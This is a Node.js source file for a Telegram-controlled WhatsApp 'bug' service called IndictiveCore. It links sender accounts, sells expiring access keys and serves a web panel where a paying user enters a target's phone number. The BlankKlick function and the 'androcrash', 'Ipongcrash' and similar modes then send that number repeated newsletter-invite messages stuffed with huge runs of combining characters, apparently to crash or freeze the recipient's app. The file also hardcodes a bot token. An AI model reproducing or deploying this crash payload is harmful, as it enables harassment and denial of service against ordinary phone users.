// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "7969715775:AAFN37aqyOw1TTktXXMHXSlK8JYvkHvKscM";
const OWNER_ID = "7546117130";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "AIISIGMA");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command('start', async (ctx) => {
    try {
        const ambilFoto = "https://files.catbox.moe/u040ae.jpg";
        
        await ctx.replyWithPhoto(ambilFoto, {
            caption: `<blockquote>Creator : @AiiSigma
Version : 5.01
League : Asia⧸Bandung

⚙️ SETTINGS
/addsender
/listsender
/delsender

🔑 KEY MANAGER
/addkey
/listkey
/delkey

🎗️ OWNER MANAGEMENT
/addacces
/delacces
/addowner
/delowner
/setjeda - 1𝗆⧸1𝖽⧸1𝗌

<a href="https://t.me/AiiSigma">© 𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a></blockquote>`,
            parse_mode: 'HTML',
        });
    } catch (error) {
        console.error('Error sending start message:', error);
        await ctx.reply('❌ Gagal mengirim gambar, silakan coba lagi.');
    }
});

// =================== SENDER =================== \\
bot.command("addsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addsender Number_\n_Example : /addsender 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// =================== KEY MANAGEMENT =================== \\
bot.command("addkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCESS USER\n—Please register first to access this feature."
    );
  }

  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
  userId,
  '❌ <b>Syntax Error!</b>\n\nGunakan format:\n<code>/addkey User,Day</code>\nContoh:\n<code>/addkey rann,30d</code>',
  { parse_mode: 'HTML' }
);
  }

  const [username, durasiStr] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  const text = [
    `✅ <b>Key berhasil dibuat:</b>\n`,
    `🆔 <b>Username:</b> <code>${username}</code>`,
    `🔑 <b>Key:</b> <code>${key}</code>`,
    `⏳ <b>Expired:</b> ${expiredStr} WIB\n`,
    "<b>Note:</b>\n- Jangan disebar\n- Jangan difreekan\n- Jangan dijual lagi"
  ].join("\n");

  ctx.telegram.sendMessage(userId, text, { parse_mode: "HTML" })
    .then(() => ctx.reply("✅ Success Send Key"))
    .catch(err => {
      ctx.reply("❌ Gagal mengirim key ke user.");
      console.error("Error kirim key:", err);
    });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// =================== ACCESS CONTROL =================== \\
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

// =================== ACCESS OWNER =================== \\
bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣶⣶⣶⣶⣦⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣄⣶⣿⠟⠛⠉⢀⣹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⡟⠛⠛⠛⠉⠀⠀⠀⠀⠒⠒⠛⠿⠿⠿⠶⣿⣷⣢⣄⡀⠀
⠀⠀⠀⢠⣿⡟⠉⠈⣻⣦⠀⠀⣠⡴⠶⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣮⣦
⠀⠀⢰⣿⠿⣿⡶⠾⢻⡿⠀⠠⣿⣄⣠⣼⣿⡇⠀⠈⠒⢶⣤⣤⣤⣤⣤⣴⣾⡿
⠀⠀⣾⣿⠀⠉⠛⠒⠋⠀⠀⠀⠻⢿⣉⣠⠟⠀⠀⠀⠀⠀⠉⠻⣿⣋⠙⠉⠁⠀
⠀⠀⣿⡿⠷⠲⢶⣄⠀⠀⠀⠀⠀⣀⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⠀⠀⠀
⠛⠛⢿⣅⣀⣀⣀⣿⠶⠶⠶⢤⣾⠋⠀⠀⠙⣷⣄⣀⣀⣀⣀⡀⠀⠘⣿⣆⠀⠀
⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠈⠛⠛⠶⠾⠋⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠛
   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

bot.launch();
console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : IndictiveCore
AUTHOR      : AiiSigma
VERSION     : V5.01 Reguler
─────────────────────────────────────\n\n`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, 'V5.01', "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, 'V5.01', "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'V5.01', 'dashboard.html'));
});

// ==================== USER DATA API ==================== //
app.get("/api/user-data", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Hitung sisa hari
  const now = Date.now();
  const remainingDays = Math.max(0, Math.ceil((currentUser.expired - now) / (1000 * 60 * 60 * 24)));

  // Tentukan level
  let accessLevel = "FREE USER";
  let levelColor = "#FF6B6B";
  let levelIcon = "fa-solid fa-user";
  
  if (remainingDays > 30) {
    accessLevel = "PREMIUM USER";
    levelColor = "#4ECDC4";
    levelIcon = "fa-solid fa-crown";
  } else if (remainingDays > 7) {
    accessLevel = "STANDARD USER";
    levelColor = "#FFD166";
    levelIcon = "fa-solid fa-star";
  }

  // Format tanggal expired
  const formattedTime = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  res.json({
    username: currentUser.username,
    key: currentUser.key,
    expired: currentUser.expired,
    remainingDays,
    accessLevel,
    levelColor,
    levelIcon,
    formattedTime
  });
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./V5.01/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios", "andros-delay", "invis-iphone"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }
  
  try {
    if (mode === "andros") {
      androcrash(sock, target);
    } else if (mode === "ios") {
      Ipongcrash(sock, target);
    } else if (mode === "andros-delay") {
      androdelay(sock, target);
    } else if (mode === "invis-iphone") {
      Iponginvis(sock, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
    }, false, currentUser, "", mode));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
})
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FUNCTIONS HERE ==================== //
async function BlankKlick(sock, X) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(X, msg, {
    participant: { jid: X },
    messageId: null
  });
}
// ====================== FUNC PANGGILANNYA ====================== //
async function androcrash(sock, target) {
     for (let i = 0; i < 10; i++) {
         await sleep(1000);
         await BlankKlick(sock, target);
         await sleep(1000);
     }
}
     
async function Ipongcrash(sock, target) {
     for (let i = 0; i < 10; i++) {
         await sleep(1000);
         await BlankKlick(sock, target);
         await sleep(1000);
     }
}
     
async function Iponginvis(sock, target) {
     for (let i = 0; i < 10; i++) {
         await sleep(1000);
         await BlankKlick(sock, target);
         await sleep(1000);
     }
}

async function androdelay(sock, target) {
     for (let i = 0; i < 10; i++) {
         await sleep(1000);
         await BlankKlick(sock, target);
         await sleep(1000);
     }
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IndictiveCore - V8 Pro Interface</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* --- 1. THEME VARIABLES --- */
        :root {
            --bg-deep: #050508;
            --panel-bg: rgba(20, 20, 28, 0.85);
            --border-color: rgba(255, 255, 255, 0.08);
            --accent-purple: #bc13fe;
            --accent-blue: #4facfe;
            --accent-cyan: #00f2ff;
            --accent-red: #ff003c;
            --accent-green: #00ff88;
            --text-primary: #ffffff;
            --text-muted: #8892b0;
        }

        /* --- 2. BASE --- */
        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; user-select: none; }
        
        body {
            background-color: var(--bg-deep);
            color: var(--text-primary);
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            background-image: 
                linear-gradient(rgba(10, 10, 12, 0.95), rgba(10, 10, 12, 0.95)),
                linear-gradient(0deg, rgba(255,255,255,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
            background-size: 100% 100%, 40px 40px, 40px 40px;
        }

        /* Scanline Overlay */
        body::after {
            content: " ";
            display: block;
            position: fixed; top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 999;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }

        /* --- 3. LAYOUT CONTAINER --- */
        .main-container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            position: relative;
            z-index: 10;
        }

        @media (min-width: 1024px) {
            .main-container {
                display: grid;
                grid-template-columns: 350px 1fr;
                align-items: start;
                padding-top: 40px;
            }
            .sidebar-area { position: sticky; top: 40px; }
        }

        /* --- 4. HEADER & SIDEBAR --- */
        .header-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .back-btn {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .brand-logo {
            font-family: 'Orbitron';
            font-weight: 900;
            font-size: 20px;
            letter-spacing: 2px;
            background: linear-gradient(90deg, #fff, var(--accent-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .status-badge {
            font-size: 10px;
            font-family: 'Share Tech Mono';
            padding: 4px 8px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid var(--accent-green);
            color: var(--accent-green);
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
